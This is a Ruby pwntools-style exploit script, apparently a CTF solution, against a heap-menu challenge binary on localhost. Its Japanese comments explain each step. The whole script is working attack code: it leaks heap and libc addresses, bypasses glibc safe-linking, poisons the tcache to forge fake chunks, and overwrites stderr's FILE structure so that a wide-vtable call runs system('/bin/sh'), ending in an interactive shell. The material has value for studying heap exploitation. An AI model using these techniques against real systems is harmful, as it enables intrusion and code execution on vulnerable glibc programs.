#!/usr/bin/env ruby
# coding: ascii-8bit

require 'pwn'

if ARGV[0] == "r"
    host = "localhost"
    port = "9999"
    libc = ELF.new("libc.so.6")
    libc_main_arena_offset = 0x21a0d0
else
    host = "localhost"
    port = "9999"
    libc = ELF.new("/lib/x86_64-linux-gnu/libc.so.6")
    libc_main_arena_offset = 0x21a0d0
end

$z = Sock.new host, port
def z; $z; end
elf = ELF.new("chall")

def create(idx)
    z.sendline("1")
    z.recvuntil("index: ")
    z.sendline(idx)
    z.recvuntil("> ")
end

def read(idx)
    z.sendline("2")
    z.recvuntil("index: ")
    z.sendline(idx)
    data = z.recvuntil("> ")
    return data.split("1. create")[0].chop
end

def update(idx, body, wait_prompt = true)
    z.sendline("3")
    z.recvuntil("index: ")
    z.sendline(idx)
    z.recvuntil("content: ")
    z.send(body)
    z.recvuntil("> ") if wait_prompt
end

def delete(idx)
    z.sendline("4")
    z.recvuntil(": ")
    z.sendline(idx)
    z.recvuntil("> ")
end

def exit_command
    z.sendline("5")
    z.recvuntil("Bye")
end

def protect_ptr(pos, ptr)
    return (pos >> 12) ^ ptr
end

# main
z.recvuntil("> ")

create(0)
delete(0)
create(0)
heap_address_leak = read(0)
heap_address_leak = u64(heap_address_leak.rjust(8, "\x00"))
heap_base = heap_address_leak.to_s(16)[...-3].to_i(16)

puts "[*] Heap base address: #{heap_base.to_s(16)}"

chunkA_pos = heap_base + 0x330
chunkA_ptr = heap_base + 0x10
create(1) # 先にチャンクを作って、
delete(0) # 解放することで、tcache countを1にする
delete(1) # 続けて違うチャンクを解放することで、tcache countを2にしておく

# tcache count書き換え用のfake chunk
addr = protect_ptr(chunkA_pos, chunkA_ptr)
update(-1, p64(addr))
create(0) # tcache count 1
create(1) # tcache count 0になり、書き換えたいチャンクのアドレスが帰ってくる

# tcache link 書き換え用のfake chunk
create(2) # tcache count 0
delete(0) # tcache count 1
delete(2) # tcache count 2
addr = protect_ptr(heap_base + 0x3C0, heap_base + 0xc0)
update(-1, p64(addr))
create(0) # tcache count 1
create(2) # tcache count 0 になる

=begin
下記のようなfake chunkを作成して、tcache binsがこれを指すようにcountやlink先を書き換える
gef> x/10gx 0x000055a04c3f43c0
0x55a04c3f43c0:	0x0000000000000000	0x0000000000000421
0x55a04c3f43d0:	0x0000000000000000	0x0000000000000000
=end

update(0, p64(0) + p64(0x421))
update(1, p16(0) * 7 + p16(1)) # tcache count
update(2, p64(0) + p64(heap_base + 0x3d0)) # tcache link
create(3) # 上記fake chunkが帰ってくる

# 末尾0x3d0(サイズ420)の次に、位置するであろうfake chunkを作る
update(1, p16(0) * 7 + p16(1)) # tcache count
update(2, p64(0) + p64(heap_base + 0x3c0 + 0x420)) # tcache link
create(4) # 上記fake chunkが帰ってくる

# 上記で作ったfake chunkに、fake chunkを作成する
# このfake chunkがないとfree時のチェックで弾かれてしまう
# 1. 削除対象である末尾0x3d0の次に位置するチャンクのPREV_INUSE bitが立っている
# 2. 上記のチャンクに対して、unlinkが動くため、次の次のチャンクとの整合性を確認されるので
# 合計2つのfakeチャンクを作る必要がある
update(4, p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21))
delete(3)
create(3)

libc_leak = u64(read(3).ljust(8, "\x00"))
libc_base = libc_leak - libc_main_arena_offset # libc main_arena
libc_system = libc_base + libc.symbols["system"]
libc_bin_sh = libc_base + 0x1d8698
puts("[*] libc leak: #{libc_leak.to_s(16)}")
puts("[*] libc base: #{libc_base.to_s(16)}")
puts("[*] libc system: #{libc_system.to_s(16)}")
puts("[*] libc /bin/sh: #{libc_bin_sh.to_s(16)}")
delete(3)
delete(0)


update(1, p16(0) * 7 + p16(1)) # tcache count
update(2, p64(0) + p64(libc_base + libc.symbols["_IO_2_1_stderr_"])) # tcache link
create(3) # 上記fake chunkが帰ってくる

update(1, p16(0) * 7 + p16(1)) # tcache count
update(2, p64(0) + p64(libc_base + libc.symbols["_IO_2_1_stderr_"] + 0x80)) # tcache link
create(0) # 上記fake chunkが帰ってくる

fake_file = [
    0x2020202020202020, # flags
    u64("/bin/sh\x00"), # _IO_read_ptr
    0, # _IO_read_end
    0, # _IO_read_base
    0, # _IO_write_base
    1, # _IO_write_ptr
    0, # _IO_write_end
    0, # _IO_buf_base
    0, # _IO_buf_end
    0, # _IO_save_base
    0, # _IO_backup_base
    0, # _IO_saved_end
    0, # _markers
    0  # _chain
].map(&:p64).join("") 
# _fileno ( _IO_2_1_stderr._wide_data._wide_vtable.__doallocate)
fake_file += p64(libc_system)
fake_file += "\x00" * (0x88 - fake_file.length)
fake_file += p64(libc_base + 0x21ba80) # _lock
fake_file += "\x00" * (0xa0 - fake_file.length)

# _IO_2_1_stderr_のwide_dataが指す先を_IO_2_1_stderr自体の先頭にしている
fake_file += p64(libc_base + libc.symbols["_IO_2_1_stderr_"]) # wide_data
fake_file += "\x00" * (0xc0 - fake_file.length)
fake_file += p32(1)
fake_file += "\x00" * (0xd8 - fake_file.length)
# ここまでが、_IO_FILE構造体のデータ

=begin
次に、下記のようにr15に_IO_FILE_plusの先頭アドレスが格納されたコードが実行される
r15+0xd8の指す先をraxに格納し、これが_IO_FILE_plus構造体のvtable構造体を指すことになる。
さらに、最後にそのraxに0x58を足したコードが呼び出される。
ここで、IO_wfile_jumpsの0x18目にある_IO_OVERFLOWを呼びたいので、
予めIO_wfile_jumpsの0x18byte目から-0x58byteした-0x40の箇所を書き込むことで、

   0x00007f232298fc82 <+306>:   mov    rax,QWORD PTR [r15+0xd8]                                                                                                       
   0x00007f232298fc89 <+313>:   mov    rdx,rax                                                                                                                        
   0x00007f232298fc8c <+316>:   sub    rdx,r13                                                                                                                        
   0x00007f232298fc8f <+319>:   cmp    rbx,rdx                                                                                                                        
   0x00007f232298fc92 <+322>:   jbe    0x7f232298fdc0 <_IO_cleanup+624>                                                                                               
   0x00007f232298fc98 <+328>:   xor    edx,edx                                                                                                                        
   0x00007f232298fc9a <+330>:   xor    esi,esi                                                                                                                        
   0x00007f232298fc9c <+332>:   mov    rdi,r15                                                                                                                        
=> 0x00007f232298fc9f <+335>:   call   QWORD PTR [rax+0x58]      
=end
libc_IO_wfile_jumps = libc_base + 0x2160c0
fake_file += p64(libc_IO_wfile_jumps - 0x40)
fake_file += p64(libc_base + libc.symbols["_IO_2_1_stderr_"] + 8) # _wide_data._wide_vtable
update(3, fake_file[0...0x80])

# > を待とうとすると_IO_2_1_stderr_を上書きしているせいかプロンプトが出力されなかったので、
# wait_promptという引数をあとから追加した
update(0, fake_file[0x80...], wait_prompt=false)

z.sendline("5")
z.interact


